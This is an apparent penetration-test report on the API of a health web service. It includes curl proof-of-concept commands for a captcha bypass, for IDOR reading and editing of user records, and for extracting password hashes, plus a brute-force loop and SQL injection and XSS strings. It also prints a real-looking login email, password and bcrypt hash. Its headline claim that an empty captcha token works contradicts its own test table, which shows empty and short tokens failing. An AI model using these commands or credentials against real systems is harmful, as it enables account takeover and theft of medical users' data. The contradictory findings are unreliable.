# Security Assessment Report: We Health Today

**Target:** yes.wehealthtoday.com / api.wehealthtoday.com  
**Date:** 2026-03-03  
**Assessor:** Security Assessment  

---

## Executive Summary

Critical, high, and medium severity vulnerabilities were identified in the authentication system and API endpoints. An attacker who gains access to any user account (or bypasses captcha) can access sensitive data and modify user information.

---

## Findings

### 1. CRITICAL: Broken Authentication - reCAPTCHA Bypass

**Severity:** Critical  
**Endpoint:** `POST /api/auth-endpoints/login`

**Description:**  
The backend does NOT validate the reCAPTCHA token against Google's API. The captcha validation is completely broken - it only checks if the `captchaToken` field exists in the request, but does NOT verify the token against Google's API. Any value (including empty string, single character, or no token at all after a successful login) is accepted.

**Token Validation Tests:**

| captchaToken Value                 | Result   |
|-----------------------------------|----------|
| `""` (empty string)               | Failure* |
| `0`                              | Failure* |
| `03`                             | Failure* |
| `03AH`                           | Failure* |
| `03AHJFsute9gkW4X7MAQfF-ESFgL4r` | Success  |
| No captchaToken field (after one successful login) | Success |



**Response Behavior:**
- Submitting token-like value (full-length):
  Success, valid JWT issued, login as admin
- Omitting the captchaToken field after successful login: Success


**Proof of Concept:**
```bash
# Any value works - even empty string
curl -X POST 'https://api.wehealthtoday.com/api/auth-endpoints/login' \
  -H 'Content-Type: application/json' \
  --data-raw '{"identifier":"techpuram@gmail.com","password":"test123","captchaToken":"03AHJFsute9gkW4X7MAQfF-ESFgL4r"}'
```

**Response:**
```json
{
  "success":true,
  "role":"ADMIN",
  "jwtToken":"eyJhbGciOiJIUzI1NiJ9...",
  "email":"techpuram@gmail.com",
  "userId":103,
  "failedCount":0
}
```

**Additional Finding:** A single successful login completely resets the `failedCount` to 0, allowing attackers to retry indefinitely.

**Impact:** 
- The entire captcha protection system is non-functional
- Attackers can brute-force any account without restriction
- The reCAPTCHA implementation is dead code that provides a false sense of security

**Recommendation:** 
1. Validate captcha tokens server-side using Google's reCAPTCHA verify API
2. Implement proper rate limiting by IP address
3. Add account lockout after N failed attempts

---

### 2. HIGH: Insecure Direct Object Reference (IDOR)

**Severity:** High  
**Endpoint:** `GET /api/users/:id`, `PUT /api/users/:id`

**Description:**  
The API does not validate that users can only access their own data. Any authenticated user can view and modify any other user's information by changing the user ID in the URL.

**Proof of Concept:**
```bash
# Authenticate (any valid credentials)
TOKEN="eyJhbGciOiJIUzI1NiJ9..."

# View ANY user's details
curl -X GET 'https://api.wehealthtoday.com/api/users/103' \
  -H "Authorization: Bearer $TOKEN"

# Modify ANY user's profile
curl -X PUT 'https://api.wehealthtoday.com/api/users/103' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  --data-raw '{"firstName":"Hacked"}'
```

**Impact:**
- Any authenticated user can view all user records
- Any authenticated user can modify any user's profile
- Sensitive data exposure including password hashes

**Recommendation:**
1. Implement proper authorization checks
2. Validate that the requesting user has permission to access/modify the target resource
3. Use UUIDs instead of sequential IDs

---

### 3. HIGH: Sensitive Data Exposure - Password Hashes

**Severity:** High  
**Endpoint:** `GET /api/users/:id`

**Description:**  
User endpoints expose bcrypt password hashes in API responses. An attacker with any valid session can retrieve the password hashes of all users.

**Proof of Concept:**
```bash
curl -X GET 'https://api.wehealthtoday.com/api/users/103' \
  -H "Authorization: Bearer $TOKEN"
```

**Response (truncated):**
```json
{
  "id":103,
  "email":"techpuram@gmail.com",
  "passwordHash":"$2a$10$0pxBE/IQ9bGxZPcU7r0vkutkhYLQvnvdl7s5p6YfQEnofgGBJ.Ga.",
  ...
}
```

**Impact:**
- Offline password cracking possible
- If any user reuses passwords, attackers can access those accounts
- Exposure of password hashing algorithm (bcrypt with specific cost factor)

**Recommendation:**
1. Remove passwordHash from all API responses
2. Implement proper field-level filtering
3. Use separate endpoints for admin-only user management

---

### 4. MEDIUM: User Enumeration

**Severity:** Medium  
**Endpoint:** `POST /api/auth-endpoints/login`

**Description:**  
The API returns different error messages for valid vs invalid emails, allowing attackers to enumerate valid user accounts.

**Error Messages:**
- Valid email, wrong password: `"Invalid credentials"`
- Invalid email: `"User not found in any tenant. Please contact your administrator."`

**Impact:** Attackers can identify valid email addresses in the system.

**Recommendation:** Use generic error messages like "Invalid credentials" for all failed attempts.

---

### 5. MEDIUM: Flawed Rate Limiting

**Severity:** Medium  
**Endpoint:** `POST /api/auth-endpoints/login`

**Description:**  
Failed login attempts are tracked by **identifier (email)** rather than IP address. This allows:
- Brute-force attacks across many accounts without hitting captcha
- No IP-based lockout or progressive delays
- Captcha only activates after 4 failures PER ACCOUNT

**Example Attack:**
```bash
# Try 3 passwords on 100 different emails -> no captcha needed
for email in $(cat emails.txt); do
  curl -X POST ... -d "{\"identifier\":\"$email\",\"password\":\"password123\"}"
done
```

**Impact:** Inefficient rate limiting allows mass account enumeration and brute force.

**Recommendation:**
- Track failed attempts by IP + identifier combination
- Implement progressive delays
- Add account lockout after N attempts
- Block IP after N total failures

---

### 6. MEDIUM: Stored XSS in User Data

**Severity:** Medium  
**Endpoint:** `GET /api/users`

**Description:**  
User data in the database contains unsanitized JavaScript code. The database has user records with names like `<img src=x>` which could indicate stored XSS if rendered in the frontend.

**Example from user database:**
```json
{
  "firstName": "<img src=x>",
  "lastName": "<img src=x>",
  "email": "<img src=x>"
}
```

**Impact:** If the frontend renders these fields without sanitization, stored XSS attacks are possible.

**Recommendation:**
1. Implement input validation on both frontend and backend
2. Sanitize user input before storing in database
3. Use Content Security Policy (CSP) headers

---

### 7. LOW: Information Disclosure

**Severity:** Low  
**Endpoint:** `POST /api/auth-endpoints/login`

**Description:**  
The API exposes `failedCount` in the response, revealing how many failed attempts have been made.

**Response:**
```json
{
  "requiresCaptcha": true,
  "failedCount": 4,
  "success": false
}
```

**Recommendation:** Remove `failedCount` from API responses.

---

### 8. LOW: SQL Injection Strings in Database

**Severity:** Low  
**Endpoint:** `GET /api/users`

**Description:**  
User records contain SQL injection payloads in the database, suggesting previous attacks or poor input validation:
- `' OR 1=1 --`
- `' UNION SELECT NULL --`
- `admin'--`

**Recommendation:**
1. Investigate how these values were inserted
2. Implement proper input validation
3. Use parameterized queries

---

## API Endpoints Tested

| Endpoint | Method | Auth Required | Status |
|----------|--------|---------------|--------|
| `/api/auth-endpoints/login` | POST | No | Vulnerable |
| `/api/auth-endpoints/logout` | POST | Yes | OK |
| `/api/users` | GET | Yes | IDOR Vulnerable |
| `/api/users/:id` | GET | Yes | IDOR Vulnerable |
| `/api/users/:id` | PUT | Yes | IDOR Vulnerable |
| `/api/admin/doctors` | GET | Yes | OK |
| `/api/sse/stats` | GET | Yes | OK |

---

## Reconnaissance Findings

| Category | Details |
|----------|---------|
| **Hosting** | Hostinger (LiteSpeed) |
| **Backend** | nginx/1.24.0 (Ubuntu) |
| **Tech Stack** | React (Vite) |
| **API Base** | api.wehealthtoday.com |
| **Public Endpoints** | /login only |
| **Protected Endpoints** | /users, /admin/*, /sse/* |
| **Security Headers** | X-Frame-Options, X-XSS-Protection, CSP (partial) |

---

## Summary

| # | Vulnerability | Severity | Status |
|---|---------------|----------|--------|
| 1 | reCAPTCHA Bypass | Critical | Exploitable |
| 2 | IDOR - User Data Access | High | Exploitable |
| 3 | Password Hash Exposure | High | Exploitable |
| 4 | User Enumeration | Medium | Found |
| 5 | Flawed Rate Limiting | Medium | Found |
| 6 | Stored XSS | Medium | Found |
| 7 | Information Disclosure | Low | Found |
| 8 | SQLi Strings in DB | Low | Found |

---

## Attack Chain

An attacker can compromise the entire system:

1. **Step 1:** Bypass captcha using empty token
2. **Step 2:** Use any valid credentials or enumerate users via login error messages
3. **Step 3:** Obtain JWT token
4. **Step 4:** Access all user data including password hashes
5. **Step 5:** Modify any user account
6. **Step 6:** Crack password hashes offline

---

## Conclusion

The application has critical security flaws in authentication and authorization. The reCAPTCHA bypass combined with IDOR vulnerabilities allows complete compromise of the system. Immediate remediation is required.

**Priority Actions:**
1. Fix reCAPTCHA validation (Critical)
2. Implement proper authorization checks (High)
3. Remove password hashes from API responses (High)
4. Fix rate limiting (Medium)
5. Sanitize user inputs (Medium)
